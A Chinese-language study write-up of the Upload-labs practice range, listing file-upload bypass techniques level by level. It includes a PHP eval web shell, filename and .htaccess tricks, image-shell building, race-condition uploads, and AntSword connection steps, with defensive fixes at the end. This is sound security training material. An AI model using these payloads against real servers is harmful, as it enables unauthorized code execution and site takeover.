# 第八周：文件上传漏洞（Upload-labs）实战通关全记录

> 项目背景：通过 Upload-labs 靶场（Pass-01 至 Pass-21）深度解析文件上传漏洞的各类校验缺陷与绕过手法。
> 实验环境：Kali Linux (Debian) / Apache / PHP 7.x / MariaDB
> 测试工具：Burp Suite、中国蚁剑 (AntSword)

## 一、漏洞核心认知

文件上传漏洞的本质是服务器未能对上传文件进行充分校验，一旦恶意脚本（如 `.php`）上传成功并被解析执行，即可获取 Web 权限（GetShell）。

防御体系通常包含：前端 JS 校验、后端 MIME 校验、黑/白名单后缀校验、文件头（Magic Number）校验、二次渲染等。

**核心武器（一句话木马）**：

```php
<?php @eval($_POST['cmd']); ?>
```

## 二、环境搭建

```bash
cd /var/www/html/
sudo git clone https://gitee.com/D544068814/upload-labs.git   # Gitee 镜像
sudo chmod -R 777 upload-labs/
# 浏览器访问 http://127.0.0.1/upload-labs/ 完成初始化
```

## 三、第一阶段：基础校验与黑名单对抗（Pass-01 ~ Pass-10）

| 关卡 | 防御机制 | 绕过手法 |
|------|---------|---------|
| Pass-01 | 前端 JS 校验 | `shell.jpg` 上传，Burp 抓包改 `filename="shell.php"` |
| Pass-02 | MIME（Content-Type）校验 | 改 `Content-Type` 为 `image/jpeg` |
| Pass-03 | 黑名单漏网后缀 | `shell.phtml`、`shell.php3`、`shell.php5` |
| Pass-04 | 漏掉配置文件 | 传 `.htaccess`（`AddType application/x-httpd-php .jpg`）+ 图片马 `shell.jpg` |
| Pass-05 | 大小写过滤不全 | `shell.pHp` |
| Pass-06 | 未过滤空格 | `shell.php `（Windows 特性） |
| Pass-07 | 未过滤点 | `shell.php.`（Windows 特性） |
| Pass-08 | 未过滤 `::$DATA` | `shell.php::$DATA`（NTFS 流） |
| Pass-09 | 过滤字符串组合 | `shell.php. .`（点+空格+点） |
| Pass-10 | 替换为空（双写） | `shell.pphphp`；或漏网 `.php7`/`.phar` |

> 踩坑：Pass-06 ~ 09 依赖 Windows 系统特性，靶场运行在 Linux 下不自动忽略空格/点，文件带多余字符无法解析，这些手法在真实 Windows 服务器下有效。

## 四、第二阶段：白名单、图片马与渲染（Pass-11 ~ Pass-16）

- **Pass-11/12（%00 截断）**：`save_path` 可控，抓包改 `shell.php%00`。限制：PHP 5.3.4 后已修复。
- **Pass-13 ~ 15（文件头校验）**：`getimagesize()` 校验，`cat normal.jpg shell.php > shell.jpg` 做图片马，上传后需配合 LFI 触发。
- **Pass-16（二次渲染）**：GD 库重生成图片，上传 GIF 马后用 010 Editor 定位未破坏像素区重新插入代码。

## 五、第三阶段：并发竞争与逻辑漏洞（Pass-17 ~ Pass-21）

### 条件竞争（Pass-17 ~ 19）

后端「先保存 → 检查后缀 → 不合格删除」，在删除前瞬间执行文件即可留下后门。Burp 社区版限速，用 Python 多线程或 Burp Intruder 高并发上传与访问：

```python
payload = "<?php @eval($_POST['cmd']); ?>"
# 20 上传线程 + 20 访问线程并发，删除前访问成功即生成常驻木马
```

### 数组绕过（Pass-20 ~ 21）

后端以数组接收文件名，拼接逻辑缺陷：

```http
# Pass-20
save_name[0]=shell.php/
save_name[1]=
# Pass-21
save_name[0]=shell.php
save_name[1]=.jpg
```

## 六、GetShell 验证

1. 复制上传成功的木马路径（如 `http://127.0.0.1/upload-labs/upload/shell.php`）；
2. 中国蚁剑「添加数据」：URL 填木马路径，连接密码填 `cmd`（对应 `$_POST['cmd']`）；
3. 测试连接成功后进入文件管理，可浏览目录树并执行系统命令，Web 权限沦陷。

## 七、实战排坑记录

| 问题 | 根因 | 解决 |
|------|------|------|
| GitHub 拉取失败 | 网络受限无法访问 443 | 用 Gitee 镜像仓库 |
| 蚁剑无法启动 | root 运行 Electron 需关沙盒 | 加 `--no-sandbox` 启动 |
| .htaccess 被忽略 | Linux 图形界面新建多出前缀 | `mv 1.htaccess .htaccess` 强制重命名 |
| Windows 特性关失效 | 靶场运行在 Linux 下 | 理论掌握，记录原理即可 |
| 条件竞争跑不出 | 并发过高服务器卡死 | 调低并发；或 `unlink()` 前加 `sleep(3)` 放大窗口 |

## 八、防御修复建议

1. **白名单原则（核心）**：抛弃黑名单，只允许 `jpg/png` 等白名单后缀；
2. **文件重命名**：UUID 或时间戳随机重命名，防预测路径；
3. **内容检测**：`getimagesize()` 或校验 Magic Number，防图片马与 MIME 伪造；
4. **禁止执行权限（最核心）**：上传目录禁止解析脚本（Nginx `location ~ \.php$ { deny all; }`）；
5. **分离存储**：上传文件放对象存储或独立静态服务器，物理隔离。
